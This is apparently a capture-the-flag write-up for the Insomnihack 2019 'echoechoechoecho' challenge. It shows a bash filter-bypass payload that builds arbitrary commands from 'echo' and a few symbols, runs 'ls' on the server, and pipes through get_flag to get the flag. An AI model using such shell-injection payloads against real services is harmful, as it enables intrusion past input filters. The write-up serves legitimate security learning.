# insomnihack CTF 2019
## echoechoechoecho - 216 , 18 solves
`INS{echo_echoecho_echo__echoech0echo_echoechoechoecho_bashbashbashbash}`
* [solve.py](https://github.com/ssspeedgit00/CTF/blob/master/2019/insomnihack/echoechoechoecho/solve.py)
### The Challenge
Input `thisfile` gives us the source code, the input will be appended several `|bash` and be executed by `bash`. Only very few special characters are allowed:
```python
def check_input(payload):
    if payload == 'thisfile':
        bye(open("/bin/shell").read())

    if not all(ord(c) < 128 for c in payload):
        bye("ERROR ascii only pls")

    if re.search(r'[^();+$\\= \']', payload.replace("echo", "")):
        bye("ERROR invalid characters")

    # real echolords probably wont need more special characters than this
    if payload.count("+") > 1 or \
            payload.count("'") > 1 or \
            payload.count(")") > 1 or \
            payload.count("(") > 1 or \
            payload.count("=") > 2 or \
            payload.count(";") > 3 or \
            payload.count(" ") > 30:
        bye("ERROR Too many special chars.")

    return payload
```
Payload can only contain `(` , `)` , `;` , `+` , `$` , `\` , `=` , ` ` , `'` and `echo`, and limited number of use of them.
### What we can use
* `$$` - bash process id.
* `$((1+2))` - 3.
### Variables
Thus it can not contain any lower case aphebat, but only `echo`.
* `$a` - `$echo`
* `$b` - `$echoecho`
* `$c` - `$echoechoecho`
* `echo=$$; echo $echo` -> `8`
### Bypass the limited number of use
We can store the special character in the variable with using backslash. The payload `echo=\=; echo echoecho$echo$$` will output `echoecho=8`. Then we can pass it to `bash` use `|bash`. Other example: `echo=\'; echo echo $echo$$$echo` -> `echo '8'`.
### Generate any bumber
In the seccond `bash`, `$$` is equal to `10` and we can generate `1` by `$(($$==$$))`,`$((10==10))`.For now, we can use `1` and `10` to caculate any number.
### To char
* `echo $'\154\163'` -> `ls`
### We are almost done!
```
echo=\=;echo echoecho$echo\\\; echoechoecho$echo\\\( echoechoechoecho$echo\\\) echoechoechoechoecho$echo\\\+ echoechoechoechoechoecho$echo\\\'\; echo echo echo \\\\$\\\\\$echoechoechoechoechoecho\\\\\\\\\\$\$echoechoecho\$echoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$$echo$echo\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$$echo$echo\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$$echo$echo\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$$echo$echo\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoecho\$echoechoechoecho\\\\\\\\\\$\$echoechoecho\$echoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$$echo$echo\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$$echo$echo\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoechoecho\\$\$echoechoecho\$echoechoecho\$\$$echo$echo\$\$\$echoechoechoecho\$echoechoechoecho\$echoechoechoecho\$echoechoechoecho\\\\\$echoechoechoechoechoecho
```
* `|bash`
```
echoecho=\; echoechoecho=\( echoechoechoecho=\) echoechoechoechoecho=\+ echoechoechoechoechoecho=\'; echo echo echo \\$\\$echoechoechoechoechoecho\\\\\$$echoechoecho$echoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$==$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$==$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$==$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$==$$$echoechoechoecho$echoechoechoecho$echoechoechoecho$echoechoechoecho\\\\\$$echoechoecho$echoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$==$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$==$$$echoechoechoecho$echoechoechoecho$echoechoechoechoecho\$$echoechoecho$echoechoecho$$==$$$echoechoechoecho$echoechoechoecho$echoechoechoecho$echoechoechoecho\\$echoechoechoechoechoecho
```
* `|bash`
```
echo echo \$\'\\$(($((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10==10))+$((10==10))+$((10==10))+$((10==10))))\\$(($((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10))+$((10==10))+$((10==10))+$((10==10))))\'
```
* `|bash`
```
echo $'\154\163'
```
* `|bash`
```
ls
```
* `|bash`
```
bin
boot
dev
etc
flag
get_flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```
### There is a captcha `get_flag`
I follow the solution of captcha of <a href="https://hack.more.systems/writeup/2017/12/30/34c3ctf-minbashmaxfun/">LosFuzzys</a>:
```bash
eval "echo \$(($(cat /tmp/a)))"|/get_flag|(read l;read l;echo $l>/tmp/a;cat;)
```
### Finally the flag
`INS{echo_echoecho_echo__echoech0echo_echoechoechoecho_bashbashbashbash}`